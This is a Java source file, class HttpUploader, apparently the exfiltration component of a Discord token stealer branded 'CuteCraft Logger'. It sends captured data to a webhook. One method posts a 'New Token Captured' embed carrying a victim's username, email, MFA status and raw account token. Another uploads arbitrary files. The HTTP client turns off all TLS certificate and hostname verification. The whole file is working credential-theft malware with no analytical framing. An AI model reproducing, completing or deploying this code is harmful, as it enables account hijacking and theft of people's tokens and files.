import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.time.Duration;
import java.time.Instant;
import java.util.Base64;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import org.json.JSONArray;
import org.json.JSONObject;

public class HttpUploader {

    private final String webhookUrl;

    private static final OkHttpClient httpClient;

    public HttpUploader(String webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    public boolean uploadMessage(String content) {
        try {

            if (content.length() > 2000) {
                content = content.substring(0, 1997) + "...";
            }

            JSONObject payload = new JSONObject();
            payload.put("content", content);
            payload.put("username", "CuteCraft Logger");

            return postJson(payload.toString());

        } catch (Exception e) {
            return false;
        }
    }

    public boolean uploadFile(String filename, byte[] data, String message) {
        try {
            Instant start = Instant.now();

            MultipartBody.Builder builder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM);

            if (message != null && !message.isEmpty()) {
                builder.addFormDataPart("content", message);
            }

            builder.addFormDataPart(
                "file",
                filename,
                okhttp3.RequestBody.create(data, okhttp3.MediaType.parse("application/octet-stream"))
            );

            Request request = new Request.Builder()
                .url(webhookUrl)
                .post(builder.build())
                .build();

            okhttp3.Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            response.close();

            Duration elapsed = Duration.between(start, Instant.now());

            return success;

        } catch (Exception e) {
            return false;
        }
    }

    public boolean uploadEmbed(String token, JSONObject userInfo) {
        try {
            String username = userInfo.optString("username", "Unknown");
            String discriminator = userInfo.optString("discriminator", "0000");
            String email = userInfo.optString("email", "N/A");
            boolean mfa = userInfo.optBoolean("mfa_enabled", false);

            JSONObject embed = new JSONObject();
            embed.put("title", "New Token Captured");
            embed.put("color", 0x00FF00);

            JSONArray fields = new JSONArray();
            fields.put(createField("User", username + "#" + discriminator, true));
            fields.put(createField("Email", email, true));
            fields.put(createField("MFA", mfa ? "✅" : "❌", true));
            fields.put(createField("Token", "`" + token + "`", false));

            embed.put("fields", fields);
            embed.put("timestamp", Instant.now().toString());

            JSONObject payload = new JSONObject();
            payload.put("username", "CuteCraft Logger");
            JSONArray embeds = new JSONArray();
            embeds.put(embed);
            payload.put("embeds", embeds);

            return postJson(payload.toString());

        } catch (Exception e) {
            return false;
        }
    }

    private boolean postJson(String json) {
        try {
            Request request = new Request.Builder()
                .url(webhookUrl)
                .post(okhttp3.RequestBody.create(
                    json.getBytes(StandardCharsets.UTF_8),
                    okhttp3.MediaType.parse("application/json")
                ))
                .addHeader("Content-Type", "application/json")
                .build();

            okhttp3.Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            response.close();
            return success;

        } catch (Exception e) {
            return false;
        }
    }

    private static JSONObject createField(String name, String value, boolean inline) {
        JSONObject field = new JSONObject();
        field.put("name", name);
        field.put("value", value);
        field.put("inline", inline);
        return field;
    }

    static {

        try {
            javax.net.ssl.SSLContext sslContext = javax.net.ssl.SSLContext.getInstance("TLS");
            sslContext.init(null, new TrustManager[]{
                new X509TrustManager() {
                    public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                    public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                }
            }, new SecureRandom());

            httpClient = new OkHttpClient.Builder()
                .sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) new X509TrustManager() {
                    public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                    public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                })
                .hostnameVerifier((hostname, session) -> true)
                .connectTimeout(Duration.ofSeconds(10))
                .readTimeout(Duration.ofSeconds(30))
                .build();
        } catch (Exception e) {
            throw new RuntimeException("Failed to initialize HTTP client", e);
        }
    }
}